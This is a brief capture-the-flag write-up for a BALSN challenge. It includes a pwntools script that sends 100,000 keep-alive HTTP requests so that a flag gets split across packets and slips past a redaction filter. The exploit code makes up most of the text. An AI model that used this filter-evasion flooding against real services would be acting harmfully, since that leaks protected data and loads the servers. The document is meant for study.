

## Transformer: The Guardian Knight


Solved By: Corb3nik


```
#!/usr/bin/env python3

from pwn import *
import re

# BALSN{REDACT_is_this_WAF-+!}

PACKET = """GET / HTTP/1.1\r\n\r\n"""
p = remote("waf.balsnctf.com", 8889)
p.send(PACKET * 100000)

out = p.recvall()
flags = re.findall(b"BALSN{.+?}", out)
print(set(flags))
```


if the response chunk has BALSN{...the.flag...}, it''l get redacted... But if the chunk contains BALNS{... (note the missing end because of packet fragmentation), it wont replace


so if you send a bunch of HTTP requests with keep-alive, the server will send back the flag 100000 times, and hopefully, one of the flags will be split between two packets, and not get redacted
